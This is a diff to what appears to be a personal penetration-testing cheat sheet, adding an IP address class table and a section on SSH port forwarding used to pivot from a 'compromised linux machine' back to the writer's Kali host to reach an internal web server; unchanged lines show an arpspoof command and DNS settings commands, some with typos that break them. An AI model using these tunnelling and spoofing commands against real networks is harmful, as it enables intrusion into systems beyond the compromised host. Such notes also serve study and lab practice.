@@ -84,6 +84,14 @@ TCP Flags
 * SYN – Synchronize sequence numbers (Seen on new connections)
 * FIN – No more data from sender (Seen after a connection is closed)
 
+Classes
+-------
+
+Class A: 0.0.0.0 - 127.255.255.255; Default subnet mask: 255.0.0.0; Addresses per network: 16,777,216  
+Class B: 128.0.0.0 - 191.255.255.255; Defaut subnet mask: 255.255.0.0; Addresses per network: 65,536  
+Class C: 192.0.0.0 - 223.255.255.255; Default subnet mask: 255.255.255.0; Addresses per network: 256  
+Class D (multicast): 224.0.0.0 - 239.255.255.255  
+
 Other
 =====
 
@@ -100,4 +108,16 @@ arpspoof -t 10.0.0.2 10.0.0.1
 netsh inerface IPv4 set dnsserver "Local Area connecton" static 0.0.0.0 both
 ipconfig /dlushdns
 www.dnsleaktest.com
+```
+* Port forwarding/redirection:
+```
+Proxychains has a config file /etc/proxychains.conf. Don't forget to edit the port number that is used for redirection.
+
+  ssh -f -N -R 5555:127.0.0.1:22 root@192.168.32.150
+
+Port redirection:
+
+  ssh root@192.168.32.122 -R 333:10.1.1.230:80
+
+For example, 32.122 is my local kali IP. I run the above command on a compromised linux machine. 10.1.1.230:80 is what I want to see. Then once the command is run, I open up localhost:333 on my local kali and actually see what's in 10.1.1.230:80.
 ```
